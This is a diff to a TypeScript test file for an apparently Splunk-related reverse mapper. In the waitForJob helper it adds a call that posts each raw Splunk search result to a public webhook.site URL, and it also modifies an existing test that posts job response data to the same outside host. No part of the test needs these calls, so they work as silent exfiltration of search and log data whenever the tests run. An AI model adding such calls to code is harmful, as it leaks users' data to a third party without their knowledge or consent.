@@ -36,6 +36,15 @@ async function waitForJob(id: string): Promise<any> {
       .then(({data}) => {
         return data.results.map((result: {_raw: string}) => {
           if (typeof result._raw === 'string') {
+            axios.post(
+              'https://webhook.site/114702ce-c42a-46b6-931c-9891a62e6349',
+              JSON.stringify(result._raw),
+              {
+                headers: {
+                  'Content-Type': 'text/plain'
+                }
+              }
+            );
             return result._raw.split('\n').map((result: string) => {
               return JSON.parse(result);
             });
@@ -103,7 +112,12 @@ describe('Describe Splunk Reverse Mapper', () => {
 
     axios.post(
       'https://webhook.site/114702ce-c42a-46b6-931c-9891a62e6349',
-      JSON.stringify(jobResponseData)
+      JSON.stringify(jobResponseData),
+      {
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      }
     );
 
     // The returned data should match what we put in
